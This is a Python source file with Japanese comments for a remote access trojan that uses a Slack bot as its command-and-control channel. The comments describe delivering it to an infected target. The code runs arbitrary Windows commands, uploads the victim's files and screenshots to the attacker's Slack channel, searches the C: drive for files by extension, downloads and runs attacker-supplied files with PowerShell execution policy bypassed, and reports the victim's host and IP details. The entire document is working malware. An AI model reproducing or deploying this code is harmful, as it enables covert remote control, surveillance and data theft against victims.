#slackボットを通じた命令の送受信
#遠隔操作ツールとなるslackボットの作成
#slackボットのプログラムを観戦済みの攻撃対象に配信し、SlacktのWebsocketを開け、そこから介して指令やファイルを送信し、slackワークスペースに対して実行結果を出力する
#攻撃者はslackのアプリにメッセージを送るだけ
#OSコマンド, 指定されたファイルのアップロード, PC内にある指定された拡張子を持つファイルの列挙, スクリーンショットの取得, 攻撃者側からアップロードしたファイルをダウンロードし実行, ボットの終了

# -*- config:utf-8 -*-
__author__ = 'Hiroyuki Kakara'
import ctypes
import locale
import os
import platform
import requests

#slack用のフレームワーク
from slack_bolt import App
from slack_bolt.adapter.socket_mode import SocketModeHandler
import socket
import subprocess
import win32api
import win32con
import win32gui
import win32ui

#認証情報
SLACK_URL = 'https://slack.com/api/'
SLACK_APP_TOKEN = 'xapp-<your App-Level Access Token>'
SLACK_BOT_TOKEN = 'xoxb-<your Bot User OAuth Access Token>'
app = App(token=SLACK_BOT_TOKEN)
mychannel = ''
     
#感染PC固有のチャネルを作成
def conversations_create(name):
    parameters = {'token': SLACK_BOT_TOKEN, 'name': name}
    res = requests.post(SLACK_URL + 'conversations.create', data=parameters)

#作成されたチャネルIDの取得
def conversations_setTopic(channel, topic):
    parameters = {'token': SLACK_BOT_TOKEN, 'channel': channel, 'topic':topic}
    res = requests.post(SLACK_URL + 'conversations.setTopic', data=parameters)

#チャネルのトピック欄への感染PCについての情報の記載
def convert_channelname_to_id(channel_name):
    parameters = {'token': SLACK_BOT_TOKEN}
    res = requests.post(SLACK_URL + 'conversations.list', data=parameters)
    channel_id = None
    if res.json()['ok'] == True:
        for channel in res.json()['channels']:
            if channel['name'] == channel_name:
                channel_id = channel['id']
                break
    return channel_id

#コマンド処理を受け持つ
#チャネルに登録されたファイルをダウンロードし、それぞれのファイル拡張子に応じた形で非同期で実行
def file_dl_exec(url, filename):
    #取得したトークンをヘッダーに追加
    headers = {'Authorization': "Bearer " + SLACK_BOT_TOKEN}
    res = requests.get(url, headers=headers)
    #ファイルに保存
    with open(filename, 'wb') as dl_file:
        dl_file.write(res.content)
    command = ''
    if os.path.splitext(filename)[1] == '.py':
        command = f'python {filename}'
    elif os.path.splitext(filename)[1] == '.vbs':
        command = f'Cscript {filename}'
    elif os.path.splitext(filename)[1] == '.ps1':
        command = f'powershell -ExecutionPolicy Bypass -File {filename}'
    else:
        command = filename
    #ダウンロードしたファイルの拡張子に応じて実行プログラムを選択し、非同期のサブプロセスとしてファイルを実行
    res = subprocess.Popen(command, stdout=subprocess.PIPE)
    return f'{filename} Started.'

#OS標準コマンドを実行
def exec_command(command):
    #処理の結果を受け取絵うため、同期型にてサブプロセスを実行
    res = subprocess.run(command, stdout=subprocess.PIPE)
    #日本語版Windows上で実行している場合のデコード
    if locale.getdefaultlocale() == ('ja_JP', 'cp932'):
        return res.stdout.decode('cp932')
    else:
        return res.stdout.decode()

#引数で指定されたファイルパスが存在する場合、それをチャネルにアップロードする
def file_up(filepath):
    if os.path.exists(filepath):
        files = {'file': open(filepath, 'rb')}
        parameters = {'token': SLACK_BOT_TOKEN, 'channels': mychannel, 'filename': os.path.basename(filepath)}
        res = requests.post(SLACK_URL + 'files.upload', files=files, data=parameters)
        if res.status_code == 200:
            return "Uploaded."
        else:
            return "Upload Failed."
    else:
        return f'File not found - {filepath}.'

#引数で与えられた拡張子のファイルを列挙し、改行区切りの文字列で返す
def file_dir(extension):
    file_paths = list()
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(extension):
                document_path = os.path.join(parent, filename)
                file_paths.append(document_path)
    return '\r\n'.join(file_paths)

#スクリーンショットの取得の上、チャネルにscreenshot.bmpをアップロードする関数
def get_dimensions():
    PROCESS_PER_MONITOR_DPI_AWARE = 2
    ctypes.windll.shcore.SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE)
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    return (width, height, left, top)

def screenshot():
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    if os.path.exists('screenshot.bmp'):
        files = {'file': open('screenshot.bmp', 'rb')}
        parameters = {'token': SLACK_BOT_TOKEN, 'channels': mychannel, 'filename': os.path.basename('screenshot.bmp')}
        res = requests.post(SLACK_URL + 'files.upload', files=files, data=parameters)
        if res.status_code == 200:
            return "Uploaded."
        else:
            return "Upload Failed."
    else:
        return f'File not found - screenshot.bmp.'

def build_help():
    res = ("cmd <command>: Execute Windows commands.\r\n"
           "fil <filepath>: Upload file from victim.\r\n"
           "dir <extention:e.g. .pdf>: Search for files with speficied extension.\r\n"
           "scr: Take screenshot.\r\n"
           "exit: Terminate this bot.\r\n"
           "Just upload a file: Bot will execute the uploaded file.\r\n"
           "help: Display this help.")
    return res

#メッセージをパースする関数
def parse_event(event):
    res = None
    try:
        #自分で作ったチャネルにメッセージを投稿した場合にのみ反応する条件を絞る
        if event['channel'] == mychannel:
            #messageにfileが含まれる場合、攻撃者側がチャネルにファイルを投稿したという事なので、ダウンロードして実行する為にfile_dl_execにファイルダウンロード用URLとファイル名を渡す
            if 'files' in event:
                for file_ in event['files']:
                    res = file_dl_exec(file_['url_private_download'], file_['name'])
            #その他の場合は、text部分の先頭の先頭文字をコマンドとして解釈し、それぞれに応じた関数を呼ぶ
            else:
                command = event['text']
                if command == 'exit':
                    res = 'exit'
                else:
                    if event['text'].startswith('cmd '):
                        res = exec_command(event['text'][4:])
                    elif event['text'].startswith('fil '):
                        res = file_up(event['text'][4:])
                    elif event['text'].startswith('dir '):
                        res = file_dir(event['text'][4:])
                    elif event['text'].startswith('scr'):
                        res = screenshot()
                    elif event['text'].startswith('help'):
                        res = build_help()
    except Exception as e:
        pass
    return res

#メッセージを受けとった際のイベント
@app.event("message")
def event(event, say):
    res = parse_event(event)
    if res != None:
        if res != 'exit':
            say(res)
        else:
            say("Exiting...")
            os._exit(0)

def get_global_ip():
    url = 'http://ifconfig.io/'
    headers = {'User-Agent': 'curl'}
    res = requests.get(url, headers=headers)
    return str(res.text.rstrip('\n'))

def build_topic():
    res = (f'Username: {os.environ["username"]}\r\n'
           f'Hostname: {socket.gethostname()}\r\n'
           f'FQDN: {socket.getfqdn()}\r\n'
           f'Internal IP: {socket.gethostbyname(socket.gethostname())}\r\n'
           f'Global IP: {get_global_ip()}\r\n'
           f'Platform: {platform.platform()}\r\n'
           f'Processor: {platform.processor()}\r\n'
           f'Architecture: {platform.architecture()[0]}\r\n')
    return res

def main():
    global mychannel
    mychannel_name = os.environ['username'].lower().replace(" ", "").replace(".", "") + "-" + os.environ['computername'].lower()
    conversations_create(mychannel_name)
    mychannel = convert_channelname_to_id(mychannel_name)
    conversations_setTopic(mychannel, build_topic())

    #slackサーバーとのwebsocketを開く
    SocketModeHandler(app, SLACK_APP_TOKEN).start()

if __name__ == '__main__':
    main()